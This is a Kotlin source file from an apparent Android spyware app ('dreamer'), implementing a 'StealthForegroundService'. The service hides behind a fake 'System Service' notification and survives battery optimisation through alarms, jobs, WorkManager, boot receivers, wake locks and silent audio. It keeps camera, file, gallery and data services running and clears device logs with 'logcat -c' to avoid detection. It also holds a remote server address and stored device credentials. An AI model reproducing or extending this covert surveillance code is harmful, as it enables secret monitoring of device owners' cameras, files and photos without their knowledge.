package com.h4k3r.dreamer

import android.app.*
import android.content.*
import android.os.*
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.work.*
import kotlinx.coroutines.*
import java.util.concurrent.TimeUnit
import android.app.job.JobInfo
import android.app.job.JobScheduler
import android.content.ComponentName
import android.os.PowerManager
import android.media.MediaPlayer
import android.media.AudioManager
import okhttp3.OkHttpClient

/**
 * StealthForegroundService implements advanced persistence techniques
 * to ensure the app remains running even under aggressive battery optimization
 * and system cleanup mechanisms.
 */
class StealthForegroundService : Service() {
    companion object {
        private const val TAG = "StealthService"
        private const val NOTIFICATION_ID = 2
    }

    private lateinit var secretKey: String
    private lateinit var deviceId: String
    private var wakeLock: PowerManager.WakeLock? = null
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val http = OkHttpClient()
    private val server = "https://dreamer-bot.onrender.com"
    private var isForegroundService = false

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "StealthForegroundService created")

        // Start as foreground service immediately to avoid timeout
        try {
            // Use stealth notification manager
            val stealthManager = StealthNotificationManager.getInstance(this)
            startForeground(StealthNotificationManager.STEALTH_NOTIFICATION_ID, stealthManager.getStealthNotification())
            stealthManager.enforceStealthMode()
            isForegroundService = true

            Log.d(TAG, "StealthForegroundService started with stealth notification")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start foreground service: ${e.message}")
            // Continue as background service
            Log.w(TAG, "Continuing as background service")
        }

        // Load authentication
        val prefs = getSharedPreferences("dreamer_auth", Context.MODE_PRIVATE)
        secretKey = prefs.getString("secret_key", "") ?: ""
        deviceId = prefs.getString("device_id", "") ?: ""

        // Initialize wake lock
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "StealthForegroundService::WakeLock"
        )

        // Start persistence mechanisms after foreground service is established
        startPersistenceMechanisms()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "StealthForegroundService started")

        // Ensure we're running as foreground service if possible
        try {
            if (!isForegroundService) {
                val stealthManager = StealthNotificationManager.getInstance(this)
                startForeground(StealthNotificationManager.STEALTH_NOTIFICATION_ID, stealthManager.getStealthNotification())
                stealthManager.enforceStealthMode()
                isForegroundService = true
                Log.d(TAG, "Started as foreground service from onStartCommand with stealth notification")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start foreground service in onStartCommand: ${e.message}")
            // Continue as background service
        }

        return START_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "stealth_service_channel",
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "System monitoring service"
                setSound(null, null)
                enableVibration(false)
                setShowBadge(false)
            }
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, "stealth_service_channel")
            .setContentTitle("System Service")
            .setContentText("Monitoring system processes")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .setShowWhen(false)
            .setSound(null)
            .setVibrate(null)
            .build()
    }

    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "${packageName}:StealthWakeLock"
            ).apply {
                acquire(10 * 60 * 1000L) // 10 minutes
            }
            Log.d(TAG, "Wake lock acquired")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to acquire wake lock", e)
        }
    }

    private fun startSilentAudioPlayback() {
        scope.launch {
            try {
                // Create a silent audio player that plays in a loop
                val mediaPlayer = MediaPlayer().apply {
                    setAudioStreamType(AudioManager.STREAM_MUSIC)
                    setVolume(0f, 0f) // Silent volume

                    // Use a silent audio file from raw resources if available
                    // or generate silent audio programmatically
                    try {
                        val descriptor = assets.openFd("silence.mp3")
                        setDataSource(descriptor.fileDescriptor, descriptor.startOffset, descriptor.length)
                        descriptor.close()
                    } catch (e: Exception) {
                        // Fallback: Create a silent audio track programmatically
                        setOnErrorListener { _, _, _ -> false }
                    }

                    isLooping = true
                    prepare()
                    start()
                }

                // Periodically restart the player to ensure it keeps running
                while (scope.isActive) {
                    delay(30000L) // 30 seconds
                    try {
                        if (mediaPlayer.isPlaying != true) {
                            mediaPlayer.start()
                        }
                    } catch (e: Exception) {
                        // Recreate player if it fails
                        mediaPlayer.release()
                        startSilentAudioPlayback()
                        break
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Silent audio playback error", e)
            }
        }
    }

    private fun startPersistenceMechanisms() {
        // Acquire wake lock
        wakeLock?.acquire()
        Log.d(TAG, "Wake lock acquired")

        // Schedule WorkManager revival
        scheduleWorkManagerRevival()

        // Schedule AlarmManager revival
        scheduleAlarmManagerRevival()

        // Schedule JobScheduler revival
        scheduleJobSchedulerRevival()

        // Register system event receivers
        registerSystemEventReceivers()

        // Start persistence loop
        startPersistenceLoop()

        Log.d(TAG, "StealthForegroundService started")
    }

    private fun scheduleWorkManagerRevival() {
        try {
            val workRequest = PeriodicWorkRequestBuilder<StealthRevivalWorker>(
                15, TimeUnit.MINUTES
            ).build()

            WorkManager.getInstance(this).enqueueUniquePeriodicWork(
                "stealth_revival",
                ExistingPeriodicWorkPolicy.KEEP,
                workRequest
            )
            Log.d(TAG, "WorkManager revival scheduled")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to schedule WorkManager revival: ${e.message}")
        }
    }

    private fun scheduleAlarmManagerRevival() {
        try {
            val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val intent = Intent(this, RestartReceiver::class.java).apply {
                action = "com.h4k3r.dreamer.ALARM_RESTART"
            }
            val pendingIntent = PendingIntent.getBroadcast(
                this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )

            alarmManager.setRepeating(
                AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + 5 * 60 * 1000, // 5 minutes
                5 * 60 * 1000, // 5 minutes
                pendingIntent
            )
            Log.d(TAG, "AlarmManager revival scheduled")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to schedule AlarmManager revival: ${e.message}")
        }
    }

    private fun scheduleJobSchedulerRevival() {
        try {
            val jobScheduler = getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler
            val componentName = ComponentName(this, StealthJobService::class.java)

            val jobInfo = JobInfo.Builder(1, componentName)
                .setPeriodic(15 * 60 * 1000) // 15 minutes
                .setPersisted(true)
                .build()

            jobScheduler.schedule(jobInfo)
            Log.d(TAG, "JobScheduler revival scheduled")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to schedule JobScheduler revival: ${e.message}")
        }
    }

    private fun registerSystemEventReceivers() {
        try {
            val filter = IntentFilter().apply {
                addAction(Intent.ACTION_BOOT_COMPLETED)
                addAction(Intent.ACTION_MY_PACKAGE_REPLACED)
                addAction(Intent.ACTION_PACKAGE_REPLACED)
                addAction(Intent.ACTION_PACKAGE_ADDED)
                addAction(Intent.ACTION_PACKAGE_REMOVED)
            }
            registerReceiver(systemEventReceiver, filter)
            Log.d(TAG, "System event receivers registered")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register system event receivers: ${e.message}")
        }
    }

    private val systemEventReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            Log.d(TAG, "System event received: ${intent?.action}")
            when (intent?.action) {
                Intent.ACTION_BOOT_COMPLETED,
                Intent.ACTION_MY_PACKAGE_REPLACED,
                Intent.ACTION_PACKAGE_REPLACED -> {
                    // Restart services
                    startServices()
                }
            }
        }
    }

    private fun startPersistenceLoop() {
        scope.launch {
            while (true) {
                try {
                    // Check if services are running
                    ensureCriticalServicesRunning()

                    // Release wake lock temporarily to prevent battery drain
                    wakeLock?.release()
                    Log.d(TAG, "Wake lock released temporarily")

                    delay(30 * 1000) // 30 seconds

                    // Re-acquire wake lock
                    wakeLock?.acquire()

                } catch (e: Exception) {
                    Log.e(TAG, "Persistence loop error: ${e.message}")
                    delay(10 * 1000) // 10 seconds on error
                }
            }
        }
    }

    private fun ensureCriticalServicesRunning() {
        try {
            // Start other critical services
            val services = listOf(
                CameraService::class.java,
                DataService::class.java,
                FilesService::class.java,
                GalleryService::class.java,
                PermissionMonitorService::class.java,
                WatchdogService::class.java,
                AdvancedPersistenceService::class.java
            )

            services.forEach { serviceClass ->
                val intent = Intent(this, serviceClass)
                startService(intent)
            }

            Log.d(TAG, "Critical services ensured running")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to ensure critical services: ${e.message}")
        }
    }

    private fun startServices() {
        try {
            // Start all services
            val services = listOf(
                CameraService::class.java,
                DataService::class.java,
                FilesService::class.java,
                GalleryService::class.java,
                PermissionMonitorService::class.java,
                WatchdogService::class.java,
                AdvancedPersistenceService::class.java
            )

            services.forEach { serviceClass ->
                val intent = Intent(this, serviceClass)
                startService(intent)
            }

            Log.d(TAG, "All services started")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start services: ${e.message}")
        }
    }

    private fun isScreenOn(): Boolean {
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
            powerManager.isInteractive
        } else {
            @Suppress("DEPRECATION")
            powerManager.isScreenOn
        }
    }

    private fun checkBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                // We don't have battery optimization exemption
                // Schedule a work request to prompt for it later
                val workRequest = OneTimeWorkRequestBuilder<BatteryOptimizationWorker>()
                    .setInitialDelay(1, TimeUnit.HOURS)
                    .build()

                WorkManager.getInstance(this).enqueueUniqueWork(
                    "battery_optimization_request",
                    ExistingWorkPolicy.REPLACE,
                    workRequest
                )
            }
        }
    }

    private fun applyAntiDetectionTechniques() {
        // 1. Clear logs periodically
        try {
            Runtime.getRuntime().exec("logcat -c")
        } catch (e: Exception) {
            // Ignore if not available
        }

        // 2. Memory optimization
        try {
            System.gc()
        } catch (e: Exception) {
            // Ignore
        }

        // 3. Adaptive behavior based on device usage
        if (isScreenOn()) {
            // Reduce activity when user is actively using device
            minimizeBatteryUsage()
        } else {
            // More aggressive persistence when screen is off
            maximizePersistence()
        }
    }

    private fun minimizeBatteryUsage() {
        // Release wake lock temporarily
        wakeLock?.let {
            if (it.isHeld) {
                it.release()
                Log.d(TAG, "Wake lock released temporarily")
            }
        }

        // Pause media player
        // The startSilentAudioPlayback coroutine handles this
    }

    private fun maximizePersistence() {
        // Reacquire wake lock
        if (wakeLock?.isHeld != true) {
            acquireWakeLock()
        }

        // Resume media player
        // The startSilentAudioPlayback coroutine handles this
    }

    private fun startServiceSafely(serviceClass: Class<*>): Boolean {
        return try {
            val intent = Intent(this, serviceClass)

            // Services that need to run as foreground services for background operation
            val foregroundServices = listOf(
                CameraService::class.java,
                DataService::class.java,
                StealthForegroundService::class.java,
                PermissionMonitorService::class.java,
                AdvancedPersistenceService::class.java
            )

            if (serviceClass in foregroundServices && Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                // Start as foreground service for better background persistence
                try {
                    startForegroundService(intent)
                    Log.d(TAG, "Started ${serviceClass.simpleName} as foreground service")
                    return true
                } catch (foregroundException: Exception) {
                    Log.e(TAG, "Failed to start ${serviceClass.simpleName} as foreground service", foregroundException)
                    // Fall back to regular service
                }
            }

            // Try regular startService as fallback
            startService(intent)
            Log.d(TAG, "Started ${serviceClass.simpleName} as regular service")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start ${serviceClass.simpleName}", e)
            false
        }
    }

    private fun isServiceRunning(serviceClass: Class<*>): Boolean {
        val activityManager = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        val runningServices = activityManager.getRunningServices(Integer.MAX_VALUE)
        return runningServices.any { it.service.className == serviceClass.name }
    }

    // First onDestroy method removed to fix conflict - keeping the more complete one below

    private fun reviveService() {
        try {
            // Start service normally first
            val intent = Intent(this, StealthForegroundService::class.java)
            startService(intent)

            // Schedule delayed foreground start
            Handler(Looper.getMainLooper()).postDelayed({
                try {
                    startForegroundService(intent)
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to start foreground service during revival: ${e.message}")
                }
            }, 1000)

            // Schedule WorkManager revival as backup
            scheduleWorkManagerRevival()

            Log.d(TAG, "Service revival initiated")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to revive service: ${e.message}")
            // Try one more time with a delay
            Handler(Looper.getMainLooper()).postDelayed({
                try {
                    val intent = Intent(this, StealthForegroundService::class.java)
                    startService(intent)
                } catch (e: Exception) {
                    Log.e(TAG, "Final revival attempt failed: ${e.message}")
                }
            }, 2000)
        }
    }

    override fun onDestroy() {
        Log.d(TAG, "StealthForegroundService onDestroy called")

        // Stop foreground service properly
        try {
            if (isForegroundService) {
                stopForeground(true)
                isForegroundService = false
                Log.d(TAG, "Foreground service stopped successfully")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping foreground service: ${e.message}")
        }

        // Release wake lock
        try {
            wakeLock?.release()
            Log.d(TAG, "Wake lock released")
        } catch (e: Exception) {
            Log.e(TAG, "Error releasing wake lock: ${e.message}")
        }

        // Cancel coroutine scope
        scope.cancel()

        // Unregister receivers
        try {
            unregisterReceiver(systemEventReceiver)
            Log.d(TAG, "System event receivers unregistered")
        } catch (e: Exception) {
            Log.e(TAG, "Error unregistering receivers: ${e.message}")
        }

        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}

